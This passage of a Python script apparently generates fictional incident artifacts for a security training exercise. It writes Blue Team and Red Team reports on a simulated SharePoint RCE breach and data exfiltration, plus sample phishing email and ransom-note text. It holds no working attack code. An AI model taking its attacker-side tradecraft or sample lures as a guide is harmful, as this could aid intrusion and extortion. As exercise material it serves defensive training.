SITE COLLECTIONS ACCESSED:
--------------------------
1. /sites/CustomerPortal
   - Documents: 45,000
   - Access Time: 15:50 - 17:20 UTC
   - Documents Accessed: 15,000
   - Documents Downloaded: 450

2. /sites/HR
   - Documents: 12,000
   - Access Time: 16:00 - 17:40 UTC
   - Documents Accessed: 8,500
   - Documents Downloaded: 320

3. /sites/Finance
   - Documents: 8,500
   - Access Time: 16:10 - 18:00 UTC
   - Documents Accessed: 6,200
   - Documents Downloaded: 280

4. /sites/RD
   - Documents: 3,200
   - Access Time: 16:20 - 18:30 UTC
   - Documents Accessed: 2,100
   - Documents Downloaded: 150

ACCESS PATTERN:
---------------
Method: SharePoint REST API
User: CORP\\backdoor_user
Timeframe: 15:50 - 18:30 UTC (2 hours 40 minutes)
Total Documents Accessed: 32,800 documents
Total Documents Downloaded: 1,200 documents

SENSITIVE DATA CATEGORIES:
---------------------------
Customer PII: 15,000 records
- Names, addresses, email addresses
- Payment information (partial)
- Contract details

Employee Data: 2,400 records
- Social Security Numbers
- Salary information
- Performance reviews

Financial Records: 850 files
- Q1-Q4 2023 financials
- Budget forecasts
- Vendor contracts

Intellectual Property: 320 files
- Proprietary algorithms
- Research data
- Product designs

STATUS: UNAUTHORIZED DATA ACCESS CONFIRMED
"""
    filepath = ARTIFACTS_DIR / "sharepoint_access_phase4.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_exfiltration_traffic_sp():
    """Create data exfiltration traffic analysis."""
    content = """Network Traffic Analysis - Data Exfiltration
==========================================
Source: SP-SRV-01 (10.0.5.12)
Date Range: 2024-01-15 15:50 - 18:30 UTC
Duration: 2 hours 40 minutes

DESTINATION IPs:
----------------
1. 185.220.101.45 (port 443)
   - Protocol: HTTPS (encrypted)
   - Data Transferred: ~70 GB
   - Connection Type: Persistent

2. 45.146.164.110 (port 443)
   - Protocol: HTTPS (encrypted)
   - Data Transferred: ~50 GB
   - Connection Type: Persistent

TRAFFIC PATTERN:
---------------
Total Data Transferred: ~120 GB
Transfer Rate: ~45 GB/hour
Peak Transfer Rate: ~60 GB/hour
Connection Duration: 2 hours 40 minutes
Number of Connections: 12 persistent connections

DATA TRANSFER METHODS:
---------------------
1. SharePoint REST API calls: 60 GB
   - Method: /_api/web/GetFileByServerRelativeUrl
   - Files: .docx, .xlsx, .pdf, .pptx

2. PowerShell download scripts: 45 GB
   - Method: Invoke-WebRequest
   - Files: Database files, archives

3. Web shell downloads: 15 GB
   - Method: Direct file access via web shells
   - Files: Various formats

FILE TYPES EXFILTRATED:
-----------------------
- .docx (Word documents): 35 GB
- .xlsx (Excel spreadsheets): 28 GB
- .pdf (PDF documents): 22 GB
- .pptx (PowerPoint): 15 GB
- Database files (.mdb, .accdb): 12 GB
- Archive files (.zip, .rar): 8 GB

STATUS: ACTIVE EXFILTRATION DETECTED
RECOMMENDATION: Immediate network isolation required
"""
    filepath = ARTIFACTS_DIR / "exfiltration_traffic_phase4.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_data_inventory():
    """Create Red Team data access inventory."""
    content = """SharePoint Data Access Inventory
==================================
Target: SP-SRV-01
Date: 2024-01-15 18:30:00 UTC

SITE COLLECTIONS ACCESSED: 4
TOTAL DOCUMENTS: 68,700
DOCUMENTS DOWNLOADED: 2,100

HIGH-VALUE DATA IDENTIFIED:
---------------------------

1. Customer Portal (/sites/CustomerPortal)
   - Customer contracts: 450 files
   - Customer PII: 15,000 records
   - Project documents: 2,800 files
   - Total Size: ~45 GB

2. HR Site (/sites/HR)
   - Employee records: 2,400 records
   - Salary information: 850 files
   - Performance reviews: 1,200 files
   - Total Size: ~12 GB

3. Finance Site (/sites/Finance)
   - Financial statements: 350 files
   - Budget documents: 500 files
   - Total Size: ~8.5 GB

4. R&D Site (/sites/RD)
   - Intellectual property: 320 files
   - Research data: 2,880 files
   - Total Size: ~3.2 GB

EXFILTRATION STATUS:
--------------------
Total Data Exfiltrated: 120 GB / 120 GB (100%)
Duration: 2 hours 40 minutes
Transfer Rate: ~45 GB/hour

Data Categories:
✓ Customer PII: 15,000 records (25 GB)
✓ Employee Data: 2,400 records (8 GB)
✓ Financial Records: 850 files (35 GB)
✓ Intellectual Property: 320 files (42 GB)
✓ Contracts & Legal: 450 files (10 GB)

STATUS: EXFILTRATION COMPLETE
"""
    filepath = ARTIFACTS_DIR / "data_inventory_phase4.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_exfiltration_progress_sp():
    """Create Red Team exfiltration progress report."""
    content = """Data Exfiltration Status: COMPLETE
==================================
Target: SP-SRV-01
Date: 2024-01-15 18:30:00 UTC

TOTAL DATA EXFILTRATED: 120 GB
DURATION: 2 hours 40 minutes
TRANSFER RATE: ~45 GB/hour

DATA CATEGORIES:
---------------
✓ Customer PII: 15,000 records (25 GB)
✓ Employee Data: 2,400 records (8 GB)
✓ Financial Records: 850 files (35 GB)
✓ Intellectual Property: 320 files (42 GB)
✓ Contracts & Legal: 450 files (10 GB)

EXFILTRATION METHODS:
---------------------
- SharePoint REST API: 60 GB
- PowerShell scripts: 45 GB
- Web shell downloads: 15 GB

DESTINATION:
------------
- 185.220.101.45: 70 GB uploaded
- 45.146.164.110: 50 GB uploaded

STATUS: All high-value data successfully exfiltrated.
Ready for remediation phase.
"""
    filepath = ARTIFACTS_DIR / "exfiltration_progress_phase4.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_patch_deployment():
    """Create patch deployment status."""
    content = """SharePoint Security Patch Deployment
==========================================
Patch: KB5012345 (Emergency Security Update)
CVE: CVE-2024-XXXXX
Date: 2024-01-16 08:00:00 UTC

REMEDIATION ACTIONS COMPLETED:
------------------------------
✓ SharePoint server isolated from network
✓ All web shells removed (5 locations)
✓ Scheduled tasks deleted (3 tasks)
✓ Backdoor accounts removed (2 accounts)
✓ WMI subscriptions removed (2 subscriptions)
✓ Registry modifications reverted
✓ Service account passwords reset
✓ SharePoint server rebuilt from clean backup
✓ Patch KB5012345 installed
✓ Server restored to production

TIMELINE:
---------
Attack Duration: 18 hours
Remediation Time: 6 hours
Total Downtime: 24 hours

STATUS: REMEDIATION COMPLETE
"""
    filepath = ARTIFACTS_DIR / "patch_deployment_phase5.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_breach_impact():
    """Create data breach impact assessment."""
    content = """Data Breach Impact Assessment
===============================
Date: 2024-01-16 10:00:00 UTC

BREACH SUMMARY:
---------------
Duration: 18 hours
Data Exfiltrated: 120 GB
Records Affected: 17,400+ individuals

DATA CATEGORIES BREACHED:
-------------------------
1. Customer PII: 15,000 records
   - Names, addresses, email addresses
   - Payment information (partial)
   - Contract details

2. Employee Data: 2,400 records
   - Social Security Numbers
   - Salary information
   - Performance reviews

3. Financial Records: 850 files
   - Q1-Q4 2023 financials
   - Budget forecasts
   - Vendor contracts

4. Intellectual Property: 320 files
   - Proprietary algorithms
   - Research data
   - Product designs

REGULATORY IMPACT:
------------------
- GDPR: Notification required (EU customers)
- CCPA: Notification required (CA residents)
- Potential HIPAA implications

ESTIMATED COST: $2.5M - $5M
(Regulatory fines, notification, legal)
"""
    filepath = ARTIFACTS_DIR / "breach_impact_phase5.pdf"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_aar_sharepoint():
    """Create after-action report."""
    content = """After-Action Report - SharePoint RCE Incident
==========================================
Date: 2024-01-16 12:00:00 UTC

KEY FINDINGS:
------------
1. Vulnerability disclosure to exploitation: 4 hours
2. Detection time: 2 hours after exploitation
3. Total breach duration: 18 hours
4. Data exfiltrated: 120 GB

ROOT CAUSES:
-----------
- External-facing SharePoint server
- No patch available at time of disclosure
- WAF rules insufficient to block all exploit attempts
- Delayed detection and response

RECOMMENDATIONS:
---------------
1. Implement network segmentation for SharePoint
2. Enhance WAF rules for SharePoint-specific attacks
3. Deploy additional monitoring for SharePoint servers
4. Establish faster patch deployment procedures
5. Implement data loss prevention (DLP) controls
6. Regular security assessments of external-facing systems

STATUS: Report submitted to management and security team
"""
    filepath = ARTIFACTS_DIR / "aar_phase5.pdf"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_attack_summary_sp():
    """Create Red Team attack summary."""
    content = """SharePoint RCE Attack Summary
=============================
Mission: Exploit SharePoint RCE vulnerability and exfiltrate sensitive data
Status: SUCCESS

RESULTS:
--------
- Systems Compromised: 1 (SP-SRV-01)
- Privilege Level: Farm Administrator
- Data Exfiltrated: 120 GB
- Access Duration: 18 hours
- Persistence: 5 web shells, 3 scheduled tasks

DATA VALUE:
----------
- Customer PII: 15,000 records
- Employee Data: 2,400 records
- Financial Records: 850 files
- Intellectual Property: 320 files

Estimated Data Value: $10M+

ATTACK TIMELINE:
----------------
- Day 1, 14:30 UTC: Vulnerability disclosed
- Day 1, 15:42 UTC: Exploitation successful
- Day 1, 18:30 UTC: Data exfiltration complete
- Day 2, 08:30 UTC: Remediation detected

CONCLUSION: Attack successfully completed all objectives.
"""
    filepath = ARTIFACTS_DIR / "attack_summary_phase5.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_lessons_learned_sp():
    """Create Red Team lessons learned."""
    content = """Attack Lessons Learned
=====================

SUCCESSFUL TECHNIQUES:
---------------------
✓ RCE exploit worked flawlessly
✓ WAF evasion successful (payload encoding)
✓ Service account credential access effective
✓ Web shell persistence maintained access
✓ SharePoint API abuse for data access

DETECTION EVASION:
------------------
- WAF initially blocked but evasion worked
- Security tools detected but too late
- Persistence mechanisms not immediately discovered

AREAS FOR IMPROVEMENT:
---------------------
- Faster lateral movement
- Additional persistence methods
- Better data cataloging before exfiltration

OVERALL ASSESSMENT:
-------------------
Attack was highly successful. Target organization had:
- External-facing vulnerable system
- Insufficient WAF protection
- Delayed detection and response
- No data loss prevention

RECOMMENDATION: Continue targeting external-facing SharePoint deployments.
"""
    filepath = ARTIFACTS_DIR / "lessons_learned_phase5.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

def create_final_report():
    """Create Red Team final attack report."""
    content = """Final Attack Report - SharePoint RCE Exploitation
==================================================
Mission: Exploit SharePoint RCE vulnerability and exfiltrate sensitive data
Status: SUCCESS

RESULTS:
--------
- Systems Compromised: 1 (SP-SRV-01)
- Privilege Level: Farm Administrator
- Data Exfiltrated: 120 GB
- Access Duration: 18 hours
- Persistence: 5 web shells, 3 scheduled tasks

DATA VALUE:
----------
- Customer PII: 15,000 records
- Employee Data: 2,400 records
- Financial Records: 850 files
- Intellectual Property: 320 files

Estimated Data Value: $10M+

ATTACK TIMELINE:
-----------------
- Day 1, 14:30 UTC: Vulnerability disclosed
- Day 1, 15:42 UTC: Exploitation successful
- Day 1, 18:30 UTC: Data exfiltration complete
- Day 2, 08:30 UTC: Remediation detected

CONCLUSION: Attack successfully completed all objectives.
Target organization's security controls were insufficient to prevent or quickly detect the attack.
"""
    filepath = ARTIFACTS_DIR / "final_report_phase5.txt"
    filepath.write_text(content)
    print(f"Created: {filepath}")

if __name__ == "__main__":
    print("Generating realistic artifact files...")
    print(f"Artifacts directory: {ARTIFACTS_DIR}\n")
    
    # Create Blue Team text files (defender perspective)
    print("Creating Blue Team artifacts (defender perspective)...")
    create_edr_alert()
    create_nmap_scan()
    create_c2_traffic()
    create_privilege_escalation()
    create_lateral_movement()
    create_exfiltration_traffic()
    create_backup_status()
    
    # Create Red Team text files (attacker perspective)
    print("\nCreating Red Team artifacts (attacker perspective)...")
    create_initial_access()
    create_c2_status()
    create_recon_results()
    create_persistence_status()
    create_credential_success()
    create_lateral_status()
    create_exfiltration_progress()
    create_stolen_data_inventory()
    create_encryption_status()
    create_negotiation_status()
    create_attack_summary()
    
    # Email Bomb scenario artifacts
    print("\nCreating Email Bomb & Social Engineering Attack artifacts...")
    # Phase 1
    create_email_volume_alert()
    create_email_header_analysis()
    create_email_bomb_status()
    create_call_script()
    # Phase 2
    create_support_call_log()
    create_se_indicators()
    create_call_success()
    create_portal_status()
    # Phase 3
    create_auth_anomaly()
    create_portal_analysis()
    create_credential_success_eb()
    create_access_verification()
    # Phase 4
    create_unauthorized_access()
    create_privilege_escalation_log()
    create_email_intel()
    create_system_map()
    # Phase 5
    create_lateral_movement()
    create_exfiltration_analysis()
    create_persistence_found()
    create_exfiltration_progress_eb()
    create_stolen_data_inventory_eb()
    create_attack_summary_eb()
    
    # SharePoint RCE scenario artifacts
    print("\nCreating SharePoint RCE Zero-Day Exploitation artifacts...")
    # Phase 1
    create_sharepoint_advisory()
    create_sharepoint_version()
    create_recon_report()
    create_vuln_verification()
    # Phase 2
    create_waf_alert()
    create_iis_logs()
    create_exploit_success()
    create_server_enum()
    # Phase 3
    create_privilege_escalation_log()
    create_persistence_detection()
    create_privilege_status()
    create_persistence_deployment()
    # Phase 4
    create_sharepoint_access_log()
    create_exfiltration_traffic_sp()
    create_data_inventory()
    create_exfiltration_progress_sp()
    # Phase 5
    create_patch_deployment()
    create_breach_impact()
    create_aar_sharepoint()
    create_attack_summary_sp()
    create_lessons_learned_sp()
    create_final_report()
    
    # Create image placeholders
    create_image_placeholder(
        "phishing_email_phase1.png",
        "Phishing Email Screenshot",
        "URGENT: Invoice Payment Required - Action Needed\n\nFrom: vendor-support@legitmate-vendor.com\nTo: finance.user@corp.local\n\nClick here to download invoice: secure-invoice-download.tk"
    )
    
    create_image_placeholder(
        "ransomware_note_phase5.png",
        "YOUR FILES HAVE BEEN ENCRYPTED",
        "LockBit 3.0 Ransomware\n\nTo decrypt your files, you must pay 50 BTC\nBitcoin Address: [REDACTED]\n\nYou have 72 hours to pay.\nAfter that, the price doubles.\n\nWe have also exfiltrated your data.\nIf you do not pay, we will publish it."
    )
    
    # Create PDF placeholders
    pdf_content = """Data Classification Report
========================

Exfiltrated Data Analysis:
- Customer PII: 125,000 records
- Employee Data: 2,400 records  
- Financial Records: Q1-Q4 2023, Q1 2024
- Intellectual Property: Proprietary algorithms, research data
- Legal Documents: Contracts, NDAs, compliance records

Regulatory Impact:
- GDPR: Potential violation
- CCPA: Notification required
- HIPAA: Potential violation
- PCI-DSS: Potential violation

Estimated Fines: $5-25 million
"""
    
    create_pdf_placeholder("data_classification_phase4.pdf", "Data Classification Report", pdf_content)
    
    impact_content = """Encryption Impact Assessment
===========================

Systems Encrypted: 200+ endpoints
- 15 file servers
- 8 application servers
- 150 workstations
- Backup system (BACKUP-01)

Critical Systems Affected:
- ERP system: OFFLINE
- Email server: PARTIAL
- Customer portal: OFFLINE

Recovery Options:
- Using backups: 48-72 hours
- Paying ransom: 2-3 weeks

Business Impact: $500K/day in lost revenue
"""
    
    create_pdf_placeholder("impact_assessment_phase5.pdf", "Encryption Impact Assessment", impact_content)
    
    print("\n✓ All artifacts generated!")
    print("\nNote: For actual PNG images and PDFs, install:")
    print("  pip install Pillow reportlab")
    print("\nThen re-run this script to generate real images/PDFs.")

